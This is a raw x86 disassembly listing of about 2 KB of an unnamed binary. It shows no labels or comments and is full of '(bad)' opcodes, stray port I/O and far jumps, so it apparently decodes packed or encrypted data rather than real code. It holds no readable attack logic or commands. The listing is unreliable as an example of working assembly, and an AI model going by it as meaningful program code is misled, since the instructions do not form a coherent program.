  40d815:	mov    esi,0x92a28e56
  40d81a:	cmp    DWORD PTR [edi-0x1f],0xab1d2bba
  40d821:	xchg   ecx,eax
  40d822:	lahf   
  40d823:	jbe    0x40d899
  40d825:	mov    eax,ds:0x53988908
  40d82a:	leave  
  40d82b:	test   eax,0xfa620f12
  40d830:	mov    WORD PTR [esi-0x46a8a5a2],ss
  40d836:	xchg   BYTE PTR [ebx+ebx*4-0x231b52d7],bl
  40d83d:	popa   
  40d83e:	popf   
  40d83f:	bnd ds jmp 0x40d7c9
  40d843:	add    al,0xaf
  40d845:	or     al,0x1c
  40d847:	into   
  40d848:	(bad)  
  40d849:	fisubr WORD PTR [ebx]
  40d84b:	(bad)  
  40d84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84d:	stos   DWORD PTR es:[edi],eax
  40d84e:	lea    esp,[ebp-0x72]
  40d851:	iret   
  40d852:	in     eax,0x51
  40d854:	pop    es
  40d855:	add    al,0xdb
  40d857:	idiv   DWORD PTR [ebx+0x196806d]
  40d85d:	clc    
  40d85e:	in     al,dx
  40d85f:	(bad)  
  40d860:	xor    dl,BYTE PTR [ebp-0x1339934b]
  40d866:	sahf   
  40d867:	push   ebx
  40d868:	jmp    0x40d8a5
  40d86a:	sub    al,0x8c
  40d86c:	cmp    ebx,DWORD PTR [ebp-0x3b917926]
  40d872:	neg    BYTE PTR [edx]
  40d874:	sub    ah,BYTE PTR [edx+0x70ff042a]
  40d87a:	mov    DWORD PTR [ebx+0x6693f3ae],ecx
  40d880:	das    
  40d881:	div    DWORD PTR [edx]
  40d883:	or     al,0xa9
  40d885:	out    dx,eax
  40d886:	jns    0x40d8bd
  40d888:	sub    eax,0x11fea77d
  40d88d:	push   ss
  40d88e:	fcomp  DWORD PTR [ecx+0x7f]
  40d891:	add    esp,ecx
  40d893:	push   edi
  40d894:	and    eax,0x534bffd8
  40d899:	add    eax,0x61da8dc1
  40d89e:	or     al,0x4c
  40d8a0:	and    edi,DWORD PTR [ebx+edi*4]
  40d8a3:	jb     0x40d8a0
  40d8a5:	jp     0x40d85e
  40d8a7:	bound  esi,QWORD PTR [ebp+0x78]
  40d8aa:	out    dx,eax
  40d8ab:	cmp    al,0xc8
  40d8ad:	pop    ds
  40d8ae:	ja     0x40d8e6
  40d8b0:	sub    DWORD PTR [edi-0x2f],eax
  40d8b3:	out    dx,al
  40d8b4:	or     BYTE PTR [esi+0x226b5217],al
  40d8ba:	cmp    ebx,eax
  40d8bc:	sbb    eax,0x54d55063
  40d8c1:	or     ecx,DWORD PTR [esi]
  40d8c3:	fbld   TBYTE PTR [esi+esi*8-0x39]
  40d8c7:	mov    ah,BYTE PTR ds:0x1941aea1
  40d8cd:	and    al,0x54
  40d8cf:	cmc    
  40d8d0:	pop    edi
  40d8d1:	out    dx,eax
  40d8d2:	cmp    edi,DWORD PTR [edx]
  40d8d4:	jp     0x40d8c5
  40d8d6:	aas    
  40d8d7:	sub    eax,0x7b4454b7
  40d8dc:	sbb    ecx,DWORD PTR [ecx-0x225ada2d]
  40d8e2:	adc    al,0x73
  40d8e4:	pop    edx
  40d8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e6:	jne    0x40d951
  40d8e8:	push   ebx
  40d8e9:	fnstenv [ebx]
  40d8eb:	in     eax,0x99
  40d8ed:	les    ebp,FWORD PTR [eax-0x61]
  40d8f0:	xor    al,0x60
  40d8f2:	pop    ds
  40d8f3:	aam    0x7
  40d8f5:	ss pop ebx
  40d8f7:	mov    esi,0x37af326e
  40d8fc:	(bad)  
  40d8fd:	mov    esi,0xe3c208d
  40d902:	xchg   edx,eax
  40d903:	nop
  40d904:	jl     0x40d8bc
  40d906:	and    DWORD PTR [esi+0xa17512d],ebx
  40d90c:	(bad)  
  40d90e:	sbb    eax,0x7eef1c1c
  40d913:	dec    eax
  40d914:	xchg   ebx,eax
  40d915:	fistp  QWORD PTR [eax]
  40d917:	mov    al,0x0
  40d919:	jg     0x40d8c8
  40d91b:	je     0x40d8bf
  40d91d:	test   BYTE PTR [edi-0x1b],0xd
  40d921:	lahf   
  40d922:	std    
  40d923:	frstor [ebx+0x7afbfde8]
  40d929:	fcmovb st,st(7)
  40d92b:	das    
  40d92c:	and    eax,0x1ec2b38d
  40d931:	pusha  
  40d932:	cmp    dh,dh
  40d934:	mov    bh,BYTE PTR [ebx+0x9]
  40d937:	or     edi,DWORD PTR [ecx-0x1b77eeb1]
  40d93d:	jg     0x40d98d
  40d93f:	sub    eax,0x5124b8e4
  40d944:	int    0xd4
  40d946:	inc    esp
  40d947:	cwde   
  40d948:	ret    0x9be1
  40d94b:	add    eax,0xae8f316e
  40d950:	fwait
  40d951:	jge    0x40d8d3
  40d953:	jb     0x40d8d7
  40d955:	inc    esi
  40d956:	imul   esp,DWORD PTR [ebx+0x18],0x1d24477c
  40d95d:	shl    ebp,cl
  40d95f:	addr16 stc 
  40d961:	test   BYTE PTR [ebp+0x1d192f56],al
  40d967:	mov    al,ds:0xb08aa98e
  40d96c:	mov    esi,DWORD PTR [ecx+0x62]
  40d96f:	lahf   
  40d970:	int    0x5c
  40d972:	sub    BYTE PTR [eax-0x4668364d],0x12
  40d979:	jge    0x40d94d
  40d97b:	int    0x16
  40d97d:	jbe    0x40d932
  40d97f:	sbb    DWORD PTR [ebp+0x64],ebx
  40d982:	or     DWORD PTR [esp],0xffffffa9
  40d986:	(bad)  
  40d988:	jns    0x40d982
  40d98a:	mov    dl,0xe0
  40d98c:	out    dx,al
  40d98d:	test   BYTE PTR [edx-0x78ada2a2],ah
  40d993:	sbb    BYTE PTR [ecx+0x226ede87],dh
  40d999:	pop    edx
  40d99a:	push   esi
  40d99b:	dec    ebx
  40d99c:	cwde   
  40d99d:	cmp    ah,ch
  40d99f:	push   ds
  40d9a0:	call   0x3c671cee
  40d9a5:	add    eax,0x6f1162e5
  40d9aa:	sub    BYTE PTR [edi+edx*2+0x10cac1b],bl
  40d9b1:	or     eax,0x5c16a273
  40d9b6:	jno    0x40d98b
  40d9b8:	dec    ecx
  40d9b9:	push   es
  40d9ba:	pop    ds
  40d9bb:	clc    
  40d9bc:	add    BYTE PTR [edx],dl
  40d9be:	inc    edx
  40d9bf:	mov    ds:0x1707002,eax
  40d9c4:	retf   0x6f73
  40d9c7:	sbb    al,0xe
  40d9c9:	mov    ebp,DWORD PTR [esi+ebp*8]
  40d9cc:	xor    dh,BYTE PTR [esp+esi*2]
  40d9cf:	sbb    eax,0x7c109056
  40d9d4:	dec    esi
  40d9d5:	push   ecx
  40d9d6:	sar    DWORD PTR [edi-0x234e6485],0xd5
  40d9dd:	mov    eax,0xc09d07a2
  40d9e2:	fwait
  40d9e3:	jg     0x40da5d
  40d9e5:	idiv   DWORD PTR [ebp-0x3701d2af]
  40d9eb:	rcl    DWORD PTR [edi-0x70ddbfb7],1
  40d9f1:	mov    dl,BYTE PTR [eax+0x7]
  40d9f4:	cmp    ebp,DWORD PTR [edx+0x1aea0b36]
  40d9fa:	out    0x86,al
  40d9fc:	(bad)  
  40d9fd:	(bad)
  40da01:	mov    ebx,esi
  40da03:	cs dec ebp
  40da05:	int    0x96
  40da07:	int3   
  40da08:	adc    eax,DWORD PTR [ecx+0x55]
  40da0b:	mov    ?,edx
  40da0d:	xchg   ecx,eax
  40da0e:	jecxz  0x40da58
  40da10:	or     DWORD PTR [ebx],eax
  40da12:	mov    al,0x3a
  40da14:	sub    ch,BYTE PTR [ebx-0x4c]
  40da17:	clc    
  40da18:	je     0x40da81
  40da1a:	jecxz  0x40d9a4
  40da1c:	cmp    eax,edi
  40da1e:	data16 sbb al,0x3
  40da21:	xor    esi,DWORD PTR [esi+0x25bbab93]
  40da27:	aam    0x92
  40da29:	mov    DWORD PTR [edx+0xd],0x2ace94a9
  40da30:	mov    ebx,DWORD PTR [edx]
  40da32:	clc    
  40da33:	mov    al,ds:0x27879850
  40da38:	sbb    BYTE PTR [ebx+0x1c26d5f4],dl
  40da3e:	out    0x29,al
  40da40:	std    
  40da41:	lock mov BYTE PTR [ebp-0x64],cl
  40da45:	mulps  xmm3,XMMWORD PTR [eax-0xa849a1a]
  40da4c:	inc    edi
  40da4d:	mov    edi,0xbe0f0b2a
  40da52:	xchg   esi,eax
  40da53:	push   ebp
  40da54:	fdiv   QWORD PTR [ebx]
  40da56:	cmpps  xmm0,XMMWORD PTR [esp+ebx*8+0x3926c1b1],0xc0
  40da5f:	fst    st(5)
  40da61:	jbe    0x40da2c
  40da63:	popf   
  40da64:	jb     0x40dad9
  40da66:	(bad)  
  40da67:	and    eax,esp
  40da69:	and    DWORD PTR [ebx-0x76d34887],esi
  40da6f:	daa    
  40da70:	cs cmp eax,eax
  40da73:	sub    esi,esi
  40da75:	fimul  DWORD PTR [eax]
  40da77:	mov    ecx,0xeaf11e3e
  40da7c:	jl     0x40dae2
  40da7e:	adc    DWORD PTR [ecx],ecx
  40da80:	mov    dh,0x18
  40da82:	ror    BYTE PTR [eax+0x51],cl
  40da85:	xlat   BYTE PTR ds:[ebx]
  40da86:	aam    0x8e
  40da88:	mov    dl,0x2c
  40da8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da8b:	dec    edx
  40da8c:	sub    DWORD PTR [ebx+0x1a],ecx
  40da8f:	push   ebp
  40da90:	xor    al,ch
  40da92:	call   0xc9a6:0x1bfdc8d4
  40da99:	leave  
  40da9a:	cdq    
  40da9b:	iret   
  40da9c:	rol    DWORD PTR [ecx+0x2d6e149e],0x63
  40daa3:	into   
  40daa4:	repz sub DWORD PTR [ebp+0x49],ecx
  40daa8:	pushf  
  40daa9:	pop    edi
  40daaa:	adc    DWORD PTR [eax],0xffffff97
  40daad:	in     eax,dx
  40daae:	out    0x71,eax
  40dab0:	pop    ds
  40dab1:	repz mov dl,0xae
  40dab4:	add    eax,0x6121f058
  40dab9:	sub    al,0x29
  40dabb:	mov    si,0x118b
  40dabf:	inc    esi
  40dac0:	popf   
  40dac1:	push   edi
  40dac2:	mov    dl,0xda
  40dac4:	call   0xccd62a20
  40dac9:	fmul   st,st(7)
  40dacb:	jg     0x40daf3
  40dacd:	or     eax,0x3206d7e1
  40dad2:	cmp    BYTE PTR [edx-0x3525eaa2],cl
  40dad8:	stc    
  40dad9:	out    0x18,al
  40dadb:	and    DWORD PTR ss:[edx],ebp
  40dade:	jmp    0x40da73
  40dae0:	(bad)  
  40dae1:	push   ss
  40dae2:	lea    ebx,[ecx+0x1d]
  40dae5:	icebp  
  40dae6:	inc    ebx
  40dae7:	add    al,0x84
  40dae9:	jle    0x40daa9
  40daeb:	mov    edi,0x5b1a5385
  40daf0:	mov    edx,0xfa07b899
  40daf5:	jle    0x40dafc
  40daf7:	add    eax,0x75f1ee5b
  40dafc:	leave  
  40dafd:	or     al,ah
  40daff:	fdivr  st(6),st
  40db01:	push   esi
  40db02:	or     bh,BYTE PTR [eax+0x52433615]
  40db08:	mov    ch,0x35
  40db0a:	retf   0xbd89
  40db0d:	pop    ss
  40db0e:	not    BYTE PTR [ecx-0x2b9fa704]
  40db14:	cli    
  40db15:	int    0x1
  40db17:	sbb    DWORD PTR [eax+0x333c865a],esi
  40db1d:	lods   eax,DWORD PTR ds:[esi]
  40db1e:	jae    0x40db86
  40db20:	or     ebp,DWORD PTR [ecx+0x50ad4623]
  40db26:	rol    DWORD PTR [esi],0x55
  40db29:	mov    ds:0x22c7ba44,al
  40db2e:	outs   dx,DWORD PTR ds:[esi]
  40db2f:	fdiv   DWORD PTR [ebp+0x2b]
  40db32:	sahf   
  40db33:	(bad)  
  40db34:	and    DWORD PTR [ebp+esi*8+0x13],eax
  40db38:	push   edi
  40db39:	xor    DWORD PTR ds:0x6489ed23,ebx
  40db3f:	xchg   edi,eax
  40db40:	or     BYTE PTR [ecx],bl
  40db42:	stos   DWORD PTR es:[edi],eax
  40db43:	mov    dl,BYTE PTR [ecx+0xa]
  40db46:	bnd je 0x40dae5
  40db49:	sbb    bl,BYTE PTR [ebx]
  40db4b:	pop    esp
  40db4c:	adc    BYTE PTR [esi],0x71
  40db4f:	ins    BYTE PTR es:[edi],dx
  40db50:	inc    ebp
  40db51:	ins    BYTE PTR es:[edi],dx
  40db52:	xchg   ebx,eax
  40db53:	pop    es
  40db54:	(bad)  
  40db55:	mov    bl,0xd2
  40db57:	aam    0x80
  40db59:	adc    edx,edx
  40db5b:	rol    BYTE PTR [ecx-0x49],1
  40db5e:	and    DWORD PTR [eax-0x7758e6b6],edx
  40db64:	out    0x8e,eax
  40db66:	ret    0x9aef
  40db69:	sub    bl,BYTE PTR [ebx-0xe0864ba]
  40db6f:	fcmovb st,st(0)
  40db71:	mov    dl,0xd9
  40db74:	dec    edi
  40db75:	mov    esp,0xbc82c21b
  40db7a:	fwait
  40db7b:	cmp    BYTE PTR [edx],dh
  40db7d:	fcmovu st,st(1)
  40db7f:	mov    eax,ds:0x251193fa
  40db84:	les    ebx,FWORD PTR [edx+eax*8+0x78]
  40db88:	dec    esp
  40db89:	mov    esi,0xce1e85d
  40db8e:	mov    al,0x7d
  40db90:	rol    DWORD PTR [eax-0x1fe7fd49],cl
  40db96:	inc    ebx
  40db97:	pop    es
  40db98:	inc    esi
  40db99:	cmp    BYTE PTR [ebp+ebp*2+0xfd8b151],bh
  40dba0:	jb     0x40dbf9
  40dba2:	shl    BYTE PTR [eax-0x6593f051],1
  40dba8:	call   0xb2adc308
  40dbad:	add    eax,0xa1c55c95
  40dbb2:	push   ebp
  40dbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb4:	mov    edx,0x426e529d
  40dbb9:	call   DWORD PTR [ecx+0x24]
  40dbbc:	push   es
  40dbbd:	fstp   QWORD PTR ds:[eax]
  40dbc0:	mov    edx,0x88170d83
  40dbc5:	push   cs
  40dbc6:	aas    
  40dbc7:	jg     0x40db6d
  40dbc9:	xor    DWORD PTR [ecx],0x58d47d98
  40dbcf:	or     ecx,DWORD PTR [edi]
  40dbd1:	push   cs
  40dbd2:	push   ss
  40dbd3:	push   ebx
  40dbd4:	mov    cl,0xc4
  40dbd6:	push   ss
  40dbd7:	les    ebp,FWORD PTR [ecx]
  40dbd9:	or     edx,ebx
  40dbdb:	push   0xffffffbb
  40dbdd:	mov    ds:0x27850d2e,al
  40dbe2:	or     al,0x67
  40dbe4:	pop    ds
  40dbe5:	adc    eax,0xc271c460
  40dbea:	inc    edi
  40dbeb:	mov    ch,0x9d
  40dbed:	bnd jl 0x40dbbd
  40dbf0:	mov    edi,0x5481a669
  40dbf5:	in     al,dx
  40dbf6:	jns    0x40dc44
  40dbf8:	add    DWORD PTR [ebx*1+0x382d6fe0],esp
  40dbff:	ds or  al,bl
  40dc02:	repnz inc ecx
  40dc04:	jge    0x40dbd9
  40dc06:	dec    ecx
  40dc07:	fcmovnu st,st(5)
  40dc09:	pop    eax
  40dc0a:	jbe    0x40dc30
  40dc0c:	and    eax,0x9a64440d
  40dc11:	rol    DWORD PTR [esi-0x5e],1
  40dc14:	and    cl,ch
  40dc16:	(bad)  
  40dc17:	mov    ebx,0x847abd04
  40dc1c:	push   cs
  40dc1d:	xchg   ebx,eax
  40dc1e:	fs into 
  40dc20:	clc    
  40dc21:	dec    esp
  40dc22:	stc    
  40dc23:	pop    edi
  40dc24:	cmp    BYTE PTR [esi+0x3e],cl
  40dc27:	inc    ecx
  40dc28:	dec    ebp
  40dc29:	xchg   edx,eax
  40dc2a:	add    esp,DWORD PTR [esi]
  40dc2c:	adc    cl,bh
  40dc2e:	das    
  40dc2f:	pop    esp
  40dc30:	(bad)  
  40dc32:	mov    esi,0xd55fb06a
  40dc37:	sahf   
  40dc38:	xchg   esi,eax
  40dc39:	js     0x40dc74
  40dc3b:	scas   eax,DWORD PTR es:[edi]
  40dc3c:	push   esp
  40dc3d:	jmp    0x41b6:0xa56e46ee
  40dc44:	in     eax,dx
  40dc45:	rcr    DWORD PTR [edi+0x7cd562a0],1
  40dc4b:	dec    edi
  40dc4c:	xchg   edi,eax
  40dc4d:	imul   edi,DWORD PTR [ecx],0x2d563c13
  40dc53:	mov    ds:0x6e9396f5,al
  40dc58:	test   BYTE PTR ds:0xe1b80f84,0x4e
  40dc5f:	out    dx,al
  40dc60:	test   DWORD PTR [edx-0x1b],ebp
  40dc63:	inc    edi
  40dc64:	std    
  40dc65:	call   0xd6a:0x1f9b2e11
  40dc6c:	adc    esi,edx
  40dc6e:	mov    edx,0x66043f32
  40dc73:	(bad)  
  40dc74:	sbb    DWORD PTR [esi-0x1a6d90a3],ecx
  40dc7a:	int3   
  40dc7b:	jnp    0x40dc8e
  40dc7d:	shr    DWORD PTR [esi+0x36],cl
  40dc80:	pop    ebx
  40dc81:	cmp    BYTE PTR [ecx-0x4f],bh
  40dc84:	test   DWORD PTR [ecx+edx*1-0x5ce5ccfa],esi
  40dc8b:	inc    ecx
  40dc8c:	inc    ebp
  40dc8d:	push   ebp
  40dc8e:	pop    ds
  40dc8f:	dec    ebp
  40dc90:	retf   
  40dc91:	cmp    eax,0x6fa907d0
  40dc96:	shl    BYTE PTR [edi+0x61b8af06],cl
  40dc9c:	ss or  al,0x6c
  40dc9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca0:	sub    cl,BYTE PTR [ebx]
  40dca2:	ins    DWORD PTR es:[edi],dx
  40dca3:	rol    BYTE PTR [eax+ebx*2+0x7b],cl
  40dca7:	inc    eax
  40dca8:	adc    al,0x2c
  40dcaa:	retf   0x9855
  40dcad:	pop    edx
  40dcae:	mov    eax,ds:0x5a50dfee
  40dcb3:	mov    bl,0x64
  40dcb5:	mov    bl,0x20
  40dcb7:	mov    bl,BYTE PTR [edx+0x748e334e]
  40dcbd:	call   0xbb34:0x679b7a17
  40dcc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcc5:	shrd   esp,ebp,0xcf
  40dcc9:	retf   0x506a
  40dccc:	pusha  
  40dccd:	cld    
  40dcce:	cli    
  40dccf:	aam    0x45
  40dcd1:	inc    edi
  40dcd2:	push   ss
  40dcd3:	or     DWORD PTR [edx-0x111a8375],0x66
  40dcda:	mov    BYTE PTR [edi],cl
  40dcdc:	adc    ebp,DWORD PTR [ecx-0xab62fe5]
  40dce2:	and    al,0x2f
  40dce4:	cmc    
  40dce5:	or     eax,0xa0fcabef
  40dcea:	jo     0x40dd21
  40dcec:	gs dec esp
  40dcee:	mov    ecx,0x59971996
  40dcf3:	dec    edx
  40dcf4:	sub    al,0xdb
  40dcf6:	stos   BYTE PTR es:[edi],al
  40dcf7:	mov    bh,0x92
  40dcf9:	std    
  40dcfa:	into   
  40dcfb:	(bad)  
  40dcfc:	mov    eax,0xc33bbc42
  40dd01:	xor    eax,0x8f730232
  40dd06:	jb     0x40dd51
  40dd08:	fmul   QWORD PTR [ebx+0x10bec910]
  40dd0e:	xchg   esi,eax
  40dd0f:	hlt    
  40dd10:	mov    ch,0xcf
  40dd12:	jecxz  0x40dd79
  40dd14:	xor    eax,0xee7279c5
  40dd19:	daa    
  40dd1a:	outs   dx,BYTE PTR ds:[esi]
  40dd1b:	pop    edi
  40dd1c:	lods   al,BYTE PTR ds:[esi]
  40dd1d:	jmp    0x675b3cab
  40dd22:	ja     0x40dcd7
  40dd24:	mov    dl,0xd9
  40dd26:	fisttp WORD PTR [ebx]
  40dd28:	es ins DWORD PTR es:[edi],dx
  40dd2a:	xchg   ebp,eax
  40dd2c:	pop    edx
  40dd2d:	fist   DWORD PTR [esi+eax*8-0x21]
  40dd31:	fist   DWORD PTR [edx-0x498a3a94]
  40dd37:	ss stc 
  40dd39:	(bad)  
  40dd3a:	sub    BYTE PTR [ecx+0x34],ch
  40dd3d:	fnstsw WORD PTR [ebp+0x10]
  40dd40:	rcl    BYTE PTR [esi+0x5],0xe6
  40dd44:	jb     0x40dd6f
  40dd46:	xchg   ebp,eax
  40dd47:	push   esp
  40dd48:	mov    ebp,0x7027d100
  40dd4d:	mov    eax,0x63eb2116
  40dd52:	inc    edx
  40dd53:	xchg   esi,eax
  40dd54:	sbb    esp,esi
  40dd56:	mov    ch,0x9d
  40dd58:	outs   dx,BYTE PTR ds:[esi]
  40dd59:	xchg   BYTE PTR [ebp-0x9a875e8],dh
  40dd5f:	hlt    
  40dd60:	xor    BYTE PTR [eax+0x1d],bh
  40dd63:	lods   eax,DWORD PTR ds:[esi]
  40dd64:	mov    esi,0x367608d4
  40dd69:	aam    0x9a
  40dd6b:	fs pop es
  40dd6d:	pop    ecx
  40dd6e:	lods   eax,DWORD PTR ds:[esi]
  40dd6f:	dec    edi
  40dd70:	test   DWORD PTR [eax+0x53],ecx
  40dd73:	test   BYTE PTR [eax-0x259176b8],ah
  40dd79:	cmc    
  40dd7a:	adc    eax,0x6e031af2
  40dd7f:	cmc    
  40dd80:	(bad)  
  40dd81:	test   DWORD PTR [ecx+0x4b],0xb4c2ea83
  40dd88:	mov    ah,0xc6
  40dd8a:	or     esi,DWORD PTR [edx-0x3fbe9a88]
  40dd90:	mov    eax,ds:0x119a7646
  40dd95:	fisubr WORD PTR [edx+ecx*1-0x4fd502a5]
  40dd9c:	jno    0x40dd60
  40dd9e:	pop    edi
  40dd9f:	repz cmp BYTE PTR [ecx-0x62],ah
  40dda3:	jg     0x40dde6
  40dda5:	sbb    bh,ah
  40dda7:	inc    ecx
  40dda8:	pop    esi
  40dda9:	mov    ch,0x5c
  40ddab:	lds    edx,FWORD PTR [ebx]
  40ddad:	call   0x111f:0x210b05f9
  40ddb4:	jmp    FWORD PTR [ebx+0x22057df8]
  40ddba:	mov    al,ds:0x32cbf1d3
  40ddbf:	push   esp
  40ddc0:	inc    esp
  40ddc1:	mov    cl,0xf8
  40ddc3:	enter  0x2503,0xc3
  40ddc7:	pop    ebx
  40ddc8:	scas   eax,DWORD PTR es:[edi]
  40ddc9:	inc    eax
  40ddca:	inc    ebx
  40ddcb:	ins    BYTE PTR es:[edi],dx
  40ddcc:	or     al,0x73
  40ddce:	adc    BYTE PTR [ebx+edi*4],dh
  40ddd1:	out    dx,al
  40ddd2:	mov    edi,0x979c9f60
  40ddd7:	lds    esp,FWORD PTR [edx+0x28]
  40ddda:	aam    0x80
  40dddc:	cli    
  40dddd:	push   eax
  40ddde:	cmp    eax,0x38500201
  40dde3:	popa   
  40dde4:	pop    eax
  40dde5:	add    DWORD PTR [ebx],ebx
  40dde7:	pop    edi
  40dde8:	cs mov esp,0xb0fe8760
  40ddee:	sub    BYTE PTR [esi-0x44],cl
  40ddf1:	cmp    eax,0x3713fe8b
  40ddf6:	loopne 0x40dd8f
  40ddf8:	inc    esi
  40ddf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddfa:	jl     0x40de6b
  40ddfc:	add    eax,0xa056f3ad
  40de01:	pop    ds
  40de02:	out    0xa4,eax
  40de04:	test   BYTE PTR [ecx+0x1c],al
  40de07:	jmp    0x40de6e
  40de09:	pop    es
  40de0a:	mov    WORD PTR [eax],es
  40de0c:	mov    ebx,0x60438f5f
  40de11:	mov    bh,0xa4
  40de13:	ss jne 0x40de2e
  40de16:	inc    edi
  40de17:	inc    esi
  40de18:	dec    cx
  40de1a:	dec    edi
  40de1b:	rsqrtps xmm7,XMMWORD PTR [edi+0x63]
  40de1f:	imul   ebx,eax,0x6c47c9be
  40de25:	sbb    bh,BYTE PTR [ebx]
  40de27:	aaa    
  40de28:	int    0x1a
  40de2a:	dec    esp
  40de2b:	retf   
  40de2c:	aas    
  40de2d:	push   edi
  40de2e:	jle    0x40de4a
  40de30:	(bad)
  40de34:	pusha  
  40de35:	xchg   edi,eax
  40de36:	inc    esi
  40de37:	retf   0x6957
  40de3a:	push   edi
  40de3b:	fwait
  40de3c:	js     0x40deac
  40de3e:	sub    DWORD PTR [edx],eax
  40de40:	cmp    edi,edx
  40de42:	test   eax,esi
  40de44:	dec    eax
  40de45:	or     al,0x36
  40de47:	popa   
  40de48:	(bad)  
  40de49:	cmp    ebx,ebx
  40de4b:	or     esp,eax
  40de4d:	push   eax
  40de4e:	pusha  
  40de4f:	mul    BYTE PTR [edx+0x7acafed0]
  40de55:	stc    
  40de56:	or     BYTE PTR [edx-0x59],dh
  40de59:	mov    dl,0x34
  40de5b:	sub    eax,ebp
  40de5d:	and    al,0xa
  40de5f:	sahf   
  40de60:	loope  0x40de06
  40de62:	push   es
  40de63:	xchg   edx,eax
  40de64:	arpl   WORD PTR [edi+0x3ad39275],dx
  40de6a:	cmp    BYTE PTR ds:0x6e901a77,dh
  40de70:	fadd   DWORD PTR [edi+0x1d]
  40de73:	fadd   QWORD PTR [esi]
  40de75:	aas    
  40de76:	mov    ebx,ebp
  40de78:	test   al,0x6b
  40de7a:	cmp    al,0x7a
  40de7c:	mov    bh,0x76
  40de7e:	mov    eax,ds:0xb8347382
  40de83:	cdq    
  40de84:	(bad)  
  40de85:	fisub  WORD PTR [eax+ebp*8+0x572a3276]
  40de8c:	jp     0x40debe
  40de8e:	shr    BYTE PTR [edx+0x20],cl
  40de91:	inc    ebx
  40de92:	sub    esp,DWORD PTR [ecx]
  40de94:	mov    ds:0xcf77ad21,al
  40de99:	push   0x13
  40de9b:	xchg   esi,eax
  40de9c:	in     al,0x84
  40de9e:	shl    DWORD PTR [eax-0x37879f70],cl
  40dea4:	call   0xf6db:0xcc98799c
  40deab:	ins    DWORD PTR es:[edi],dx
  40deac:	mov    al,0x15
  40deae:	jnp    0x40de39
  40deb0:	aad    0x5e
  40deb2:	sti    
  40deb3:	and    DWORD PTR [edx],0x54
  40deb6:	add    eax,0x2a115103
  40debb:	rcr    al,1
  40debd:	stos   BYTE PTR es:[edi],al
  40debe:	push   0xc798427b
  40dec3:	xchg   ecx,eax
  40dec4:	cld    
  40dec5:	loop   0x40deb0
  40dec7:	jecxz  0x40de4d
  40dec9:	xor    al,0xf6
  40decb:	rcl    DWORD PTR [edi+esi*4],1
  40dece:	jmp    0x4f40:0x5fa9e2f3
  40ded5:	or     dh,dl
  40ded7:	aaa    
  40ded8:	xchg   BYTE PTR [ebp+0x2a5d02d9],bh
  40dede:	pop    ecx
  40dedf:	cld    
  40dee0:	lods   eax,DWORD PTR ds:[esi]
  40dee1:	or     eax,0x20963fc2
  40dee6:	inc    ebx
  40dee7:	add    DWORD PTR [edi],ebx
  40dee9:	lods   al,BYTE PTR ds:[esi]
  40deea:	cli    
  40deeb:	outs   dx,BYTE PTR ds:[esi]
  40deec:	jge    0x40defc
  40deee:	aam    0x29
  40def0:	inc    ebp
  40def1:	sub    edx,DWORD PTR [ebp-0x16e6b1c5]
  40def7:	fldln2 
  40def9:	sbb    eax,0x1461382
  40defe:	imul   esp,DWORD PTR [ebp-0x1954ca22],0x7fb2fa2
  40df08:	xor    eax,0x95a802e5
  40df0d:	fcomp  QWORD PTR [ebx+0x33]
  40df10:	or     dh,dh
  40df12:	repnz aas 
  40df14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df15:	pop    ebx
  40df16:	sbb    ebx,DWORD PTR [ecx-0x22c154d9]
  40df1c:	test   DWORD PTR [ecx+0x78],edx
  40df1f:	sbb    al,0x8
  40df21:	mov    esi,0xa0ceef37
  40df26:	mov    bl,0xc3
  40df28:	lods   al,BYTE PTR ds:[esi]
  40df29:	loope  0x40def4
  40df2b:	aaa    
  40df2c:	outs   dx,BYTE PTR ds:[esi]
  40df2d:	xor    eax,0xf9bf7874
  40df32:	or     al,0xd4
  40df34:	xor    eax,0xdc9c9ad4
  40df39:	iret   
  40df3a:	js     0x40df35
  40df3c:	pop    ebx
  40df3d:	sbb    DWORD PTR [eax+0x4aee6517],0x3b0cdefa
  40df47:	outs   dx,DWORD PTR ds:[esi]
  40df49:	pop    ss
  40df4a:	jb     0x40df02
  40df4c:	pop    ss
  40df4d:	jle    0x40df85
  40df4f:	xor    BYTE PTR [ebp-0x7bd299d5],bl
  40df55:	pop    eax
  40df56:	out    0x1b,eax
  40df58:	popa   
  40df59:	loope  0x40df44
  40df5b:	cdq    
  40df5c:	sbb    bh,dh
  40df5e:	dec    ecx
  40df5f:	stos   BYTE PTR es:[edi],al
  40df60:	inc    ebp
  40df61:	rcr    DWORD PTR [ebp+esi*2+0x4351204e],0xbd
  40df69:	sbb    dl,BYTE PTR [edi-0x4675d99c]
  40df6f:	je     0x40df4a
  40df71:	xor    DWORD PTR [esi-0x6b16834b],edi
  40df77:	sbb    esp,ebx
  40df79:	or     DWORD PTR [ebx-0x1b],ebx
  40df7c:	jo     0x40dfa2
  40df7e:	call   0x934b95cf
  40df83:	jle    0x40df8f
  40df85:	dec    ebx
  40df86:	repz adc DWORD PTR [esi],0xffffff99
  40df8a:	test   DWORD PTR ds:0xa43bf9ae,esi
  40df90:	xchg   ecx,eax
  40df91:	ins    DWORD PTR es:[edi],dx
  40df92:	int3   
  40df93:	not    DWORD PTR [ebx-0x62df7b1b]
  40df99:	sti    
  40df9a:	mov    ebx,0x957cd3b3
  40df9f:	xor    ebp,eax
  40dfa1:	sbb    DWORD PTR [eax],eax
  40dfa3:	sbb    BYTE PTR [eax+0x6d],dh
  40dfa6:	xchg   edx,eax
  40dfa7:	pop    ecx
  40dfa8:	mov    al,al
  40dfaa:	js     0x40dfff
  40dfac:	mov    ecx,0xc4405953
  40dfb1:	pop    esi
  40dfb2:	outs   dx,DWORD PTR ds:[esi]
  40dfb3:	aad    0xd0
  40dfb5:	fcmove st,st(3)
  40dfb7:	mov    ebx,0x42253b5d
  40dfbc:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40dfbe:	mov    al,0xd4
  40dfc0:	in     eax,0xec
  40dfc2:	adc    edx,edi
  40dfc4:	fisubr WORD PTR [edi-0x3a]
